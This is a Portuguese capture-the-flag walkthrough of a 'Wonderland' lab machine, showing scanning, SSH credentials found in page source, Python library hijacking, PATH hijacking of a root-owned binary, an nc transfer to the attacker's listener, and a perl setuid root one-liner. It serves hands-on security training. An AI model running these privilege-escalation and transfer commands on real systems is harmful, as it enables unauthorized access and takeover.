# Wonderland

nmap -n -T4 -sCV 10.10.204.123

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/4792115a-e5d0-4093-9825-262323aa153e)

Temos duas portas abertas 22(ssh) e 80(http), ja podemos identificar que precisamos descobrir uma credencial para ter acesso a porta ssh. Vamos enumerar o HTTP.

10.10.204.123

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/f4b6910e-a8e4-4882-9038-fb73ad0359da)

Logo após vou rodar um goBuster para descobrir os diretórios.

gobuster dir -u 10.10.204.123 -w /usr/share/wordlists/dirb/common.txt

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/e18bab1b-a12d-45e1-be09-de9fb7114414)

Descobrimos um repositório chamado /r, vamos acessar ele...

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/9a0a0970-3b08-4321-818c-a80b199df5f6)

O repositório só me mostrou uma mensagem dizendo para continuar enumerando, vou rodar outro gobuster mas adicionando /r no final.

gobuster dir -u 10.10.204.123/r -w /usr/share/wordlists/dirb/common.txt

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/d0425998-ca14-4855-b40f-95fee0208740)

Ele me trouxe um repositório /a, vou tentar acesso a ele...

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/1b7936b1-07a3-4e7b-945e-468ce0936029)

Ele me retornou uma página com uma mensagem para continuar enumerando, vou rodar outro gobuster mas adicionando /a no final.

gobuster dir -u 10.10.204.123/r/a -w /usr/share/wordlists/dirb/common.txt

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/613a1753-7c84-40cc-8ef0-8b125254240a)

Ele me trouxe um repositório /b, percebi que ele tinha criado vários repositórios que no final aparece o nome do Coelho(Rabbit).

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/6c1f0de5-ab98-43d7-99ce-454e6c77b15f)

Passei letra por letra até completar o nome e as páginas são iguais com exceção da última.

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/4158373b-e27d-4bbd-b597-dd464951a150)

Só que não tem nada de interessante nesta página só um texto e uma imagem. Então decidi passar página por página utilizando view-source: na url para verificar o código-fonte e identifiquei na última página as credenciais SSH.

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/e6a5d37c-abff-4b23-8bb4-1d7cb1f30de6)

alice:HowDothTheLittleCrocodileImproveHisShiningTail

ssh alice@10.10.204.123

Utilizei o ls -la para verificar o diretórios e encontrei dois arquivos importantes root.txt(sem acesso) e walrus_and_the_carpenter.py

Acessei com sudo -l para conseguir ler o arquivo e nele tinha um poema e uma função que separava 10 versos aleatórios. Elas estavam sendo armazenadas em uma biblioteca chamada random.

python3 -c 'import sys; print (sys.path)'

Descobri também que o arquivo percorre todos os diretórios até encontrar a biblioteca.

Então criei um arquivo aleatório chamado random.py e coloquei o seguinte código.

import os
os.system("/bin/bash")

E logo em seguida executei o script para verificar se minha teoria estava certa.

sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

E conseguimos acesso a outro usuário.

Verifiquei o diretório do usuário Rabbit e contem um diretório teaParty com acesso root.

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/ac4d29e4-6b3a-4003-9290-46efc8eb1f15)

Acessei o diretório ./teaParty e ele me deu data e horário. Testei novamente e ele me mostrou a mesma data só que o horário diferente. Pesquisei em blogs e tive que executar alguns códigos para descobrir esta brecha de tarefas.

Na minha máquina executei um ouvinte:

nc -lvnp 4444

E na máquina com o SSH:

nc 10.10.133.10 4444 < teaParty

Esperei um tempo e encerrei o ouvinte e utilizei o ghidra para descompilar e verificar o que houve.

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/6099e05a-a472-4e94-8d6f-9c76a132ff1a)

Se tratava de um script com automação de data e hora.

Criei um arquivo date com o seguinte código para ele confundir e executar meu código.

#!/bin/bash

/bin/bash

Depois confirmei se meu arquivo estava funcionando com seguintes códigos:

export PATH=/tmp:$PATH
echo $PATH

Agora vou executar o ./teaParty novamente e consegui um escalação de privilégio para o usuário Hatter.

![image](https://github.com/yanfernandess/Wonderland/assets/100174458/06a7aae5-14ff-4c14-a907-85d0c0a70d0a)

Descobrimos uma senha.

WhyIsARavenLikeAWritingDesk?

Após esse ponto eu não tinha mais noção do que fazer pois passei por todos personagens do filme e então dei uma pesquisada e o LinEnum.sh ajuda a enumerar mais a fundo. Em uma pesquisa que eu fiz me mostraram que eu deveria executar os seguintes comandos

wget http://10.10.204.123:6969/LinEnum.sh
chmod +x LinEnum. eh
./LinEnum. eh

Obtemos root utilizando o perl com os códigos deste repositório abaixo:

https://gtfobins.github.io/gtfobins/perl/#capabilities

$(which perl) -e ‘use POSIX qw(setuid); POSIX::setuid(0); exec “/bin/sh”;’

Finalmente conseguimos o acesso root e vamos pegar a última bandeira.
</br>
![image](https://github.com/yanfernandess/Wonderland/assets/100174458/7ef41afd-57e7-4023-b88a-7f5fb183d866)


